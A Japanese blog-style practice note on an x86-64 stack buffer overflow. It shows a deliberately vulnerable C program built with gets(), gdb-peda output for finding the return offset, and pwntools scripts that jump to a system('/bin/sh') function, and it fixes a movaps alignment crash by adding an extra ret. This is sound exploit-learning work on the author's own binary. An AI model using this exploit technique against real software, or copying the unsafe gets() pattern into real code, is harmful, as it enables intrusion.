---


---

<h2 id="現象">現象</h2>
<p>system("/bin/sh")を入れるとここでSEGVするやつ</p>
<pre><code>&lt;do_system+1094&gt;:	movaps XMMWORD PTR [rsp+0x40],xmm0
</code></pre>
<h2 id="対策">対策</h2>
<ul>
<li>ret → system("/bin/sh")にする</li>
<li>なぜ大丈夫なのかはよく分からない（分かったら書く）</li>
</ul>
<h2 id="検証">検証</h2>
<p>こんなプログラムを用意</p>
<pre class=" language-c"><code class="prism  language-c"><span class="token comment">//bofu.c</span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">char</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"BOF &gt;&gt; "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">system_binsh</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>コンパイル</p>
<pre><code>gcc bofu.c -fno-stack-protector -no-pie
</code></pre>
<p>exploitを作る。<br>
まず飛び先を調べて、</p>
<pre><code>gdb-peda$ disass system_binsh
Dump of assembler code for function system_binsh:
   0x00000000004006a9 &lt;+0&gt;:	push   rbp
   (snip)  
End of assembler dump.
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   (snip)
   0x000000000040067e &lt;+55&gt;:	leave  
   0x000000000040067f &lt;+56&gt;:	ret    
</code></pre>
<p>returnアドレスまでの字数を調べて、</p>
<pre><code>=&gt; 0x40067f &lt;vuln+56&gt;:	ret    
   0x400680 &lt;main&gt;:	push   rbp
   0x400681 &lt;main+1&gt;:	mov    rbp,rsp
   0x400684 &lt;main+4&gt;:	mov    rax,QWORD PTR [rip+0x2009c5]        # 0x601050 &lt;stdout@@GLIBC_2.2.5&gt;
   0x40068b &lt;main+11&gt;:	mov    esi,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd28 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffdd30 ("AJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffdd38 ("AAKAAgAA6AAL")
0024| 0x7fffffffdd40 --&gt; 0x4c414136 ('6AAL')
0032| 0x7fffffffdd48 --&gt; 0x7fffffffde18 --&gt; 0x7fffffffe1b4 ("/home/jt/Downloads/old/practice/x64/bof1/a.out")
0040| 0x7fffffffdd50 --&gt; 0x100008000 
0048| 0x7fffffffdd58 --&gt; 0x400680 (&lt;main&gt;:	push   rbp)
0056| 0x7fffffffdd60 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040067f in vuln ()
gdb-peda$ patto IAAe
IAAe found at offset: 72
gdb-peda$
</code></pre>
<p>この場合こう書くはず。</p>
<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

BINARY <span class="token operator">=</span> <span class="token string">"./a.out"</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>BINARY<span class="token punctuation">)</span>

win <span class="token operator">=</span> <span class="token number">0x4006a9</span>

<span class="token comment"># r = process(BINARY)</span>
r <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>BINARY<span class="token punctuation">,</span> <span class="token triple-quoted-string string">'''
b*0x40067f
c
'''</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"&gt;&gt;"</span><span class="token punctuation">)</span>

payload  <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">72</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>win<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>すると、通らない。<br>
（手元の環境だと、ubuntu18は通らない。ubuntu16は通る。）</p>
<pre><code>=&gt; 0x7f0e944402f6 &lt;do_system+1094&gt;:	movaps XMMWORD PTR [rsp+0x40],xmm0
   0x7f0e944402fb &lt;do_system+1099&gt;:	
    call   0x7f0e94430110 &lt;__GI___sigaction&gt;
   0x7f0e94440300 &lt;do_system+1104&gt;:	
    lea    rsi,[rip+0x39e2f9]        # 0x7f0e947de600 &lt;quit&gt;
   0x7f0e94440307 &lt;do_system+1111&gt;:	xor    edx,edx
   0x7f0e94440309 &lt;do_system+1113&gt;:	mov    edi,0x3
[------------------------------------stack-------------------------------------]
0000| 0x7ffcb4ff3148 --&gt; 0x0 
0008| 0x7ffcb4ff3150 --&gt; 0x7f0e945a4e97 (sub    eax,0x622f0063)
0016| 0x7ffcb4ff3158 --&gt; 0x0 
0024| 0x7ffcb4ff3160 --&gt; 0x0 
0032| 0x7ffcb4ff3168 --&gt; 0x7f0e94440360 (&lt;cancel_handler&gt;:	push   rbx)
0040| 0x7ffcb4ff3170 --&gt; 0x7ffcb4ff3164 --&gt; 0x9444036000000000 
0048| 0x7ffcb4ff3178 --&gt; 0x0 
0056| 0x7ffcb4ff3180 --&gt; 0x2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007f0e944402f6 in do_system (line=0x40075c "/bin/sh")
    at ../sysdeps/posix/system.c:125
125	../sysdeps/posix/system.c: No such file or directory.
gdb-peda$ 
</code></pre>
<p>調べるとヒットするのは以下の記事。</p>
<blockquote>
<p>绕过ASLR–return2plt<br>
<a href="https://www.tiandiwuji.top/posts/32791/">https://www.tiandiwuji.top/posts/32791/</a></p>
</blockquote>
<p>ASLRを回避という話なの？<br>
結局、retを一回噛ましてくださいというお話になっている。<br>
私の経験値が足りないことだけはわかる。</p>
<p>とりあずは、以下のように修正すると動く。</p>
<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

BINARY <span class="token operator">=</span> <span class="token string">"./a.out"</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>BINARY<span class="token punctuation">)</span>

win <span class="token operator">=</span> <span class="token number">0x4006a9</span>
ret <span class="token operator">=</span> <span class="token number">0x40067f</span>

<span class="token comment"># r = process(BINARY)</span>
r <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>BINARY<span class="token punctuation">,</span> <span class="token triple-quoted-string string">'''
b*0x40067f
c
'''</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"&gt;&gt;"</span><span class="token punctuation">)</span>

payload  <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">72</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>win<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>以上。</p>
<p>heapは挙動が明らかに変わっていているが、こうやって微妙に変わっているのもおもしろい。<br>
しかしながらスタックBOF初心者は無事死ぬ。<br>
がんばって生きよう。</p>
<blockquote>
<p>Written with <a href="https://stackedit.io/">StackEdit</a>.</p>
</blockquote>

